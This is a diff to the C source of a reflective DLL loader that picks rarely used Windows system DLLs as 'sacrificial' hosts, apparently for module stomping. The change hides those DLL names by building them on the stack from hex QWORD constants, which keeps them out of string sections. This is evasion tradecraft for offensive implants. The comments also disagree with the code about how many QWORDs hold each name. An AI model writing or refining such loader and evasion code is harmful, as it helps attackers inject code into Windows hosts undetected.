@@ -317,16 +317,10 @@ static int bw_fill_iat(unsigned char * image, BW_LOADLIB pLoadLibraryA, BW_GETPR
 
 /* ---------------- the loader entry ---------------- */
 
-/* candidate sacrificial modules: big committed .text, rarely loaded, and
- * (importantly for CFG hosts) historically shipped WITHOUT guard CF */
-static const char * g_sacrifices[] = {
-    "xpsservices.dll",
-    "windowscodecs.dll",
-    "prvdmofcomp.dll",
-    "msoert2.dll",
-    "mfh263dec.dll",
-    NULL
-};
+/* candidate sacrificial modules: big committed .text, rarely loaded.
+ * The names are NOT stored in .rdata - extract_reflective_loader keeps
+ * .text sections only - so the loop below builds each wide name on the
+ * stack from QWORD immediates. */
 
 __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
 {
@@ -399,9 +393,9 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     if (pLLW == NULL)
         return 0;
 
-    for (k = 0; g_sacrifices[k] != NULL; k++) {
-        unsigned short wname[64];
-        const char * p = g_sacrifices[k];
+    for (k = 0; k < 4; k++) {
+        unsigned short wname[28];
+        QWORD * wq = (QWORD *)wname;
         unsigned char * cand;
         unsigned char * cand_nth;
         IMG_OPT64 * cand_opt;
@@ -412,9 +406,25 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         MEMORY_BASIC_INFORMATION mbi;
         HANDLE h;
 
-        for (i = 0; p[i] && i < 63; i++)
-            wname[i] = (unsigned short)p[i];
-        wname[i] = 0;
+        /* names: xpsservices.dll / mfh263dec.dll / prvdmofcomp.dll /
+         * msoert2.dll - three QWORDs hold up to 23 wide chars incl. NUL.
+         * little-endian wide chars, two chars per qword shown LSW-first */
+        wq[0] = 0; wq[1] = 0; wq[2] = 0;
+        switch (k) {
+        case 0: /* "xpsservices.dll" */
+            wq[0] = 0x0073007300700078ULL; wq[1] = 0x0069007600720065ULL; wq[2] = 0x002E007300650063ULL; wq[3] = 0x0000006C006C0064ULL;
+            break;
+        case 1: /* "mfh263dec.dll" */
+            wq[0] = 0x003200680066006DULL; wq[1] = 0x0065006400330036ULL; wq[2] = 0x006C0064002E0063ULL; wq[3] = 0x000000000000006CULL;
+            break;
+        case 2: /* "prvdmofcomp.dll" */
+            wq[0] = 0x0064007600720070ULL; wq[1] = 0x00630066006F006DULL; wq[2] = 0x002E0070006D006FULL; wq[3] = 0x0000006C006C0064ULL;
+            break;
+        default: /* "msoert2.dll" */
+            wq[0] = 0x0065006F0073006DULL; wq[1] = 0x002E003200740072ULL; wq[2] = 0x0000006C006C0064ULL; wq[3] = 0x0000000000000000ULL;
+            break;
+        }
+        wname[27] = 0;
 
         h = pLLW(wname, NULL, DONT_RESOLVE_DLL_REFERENCES);
         if (h == NULL)
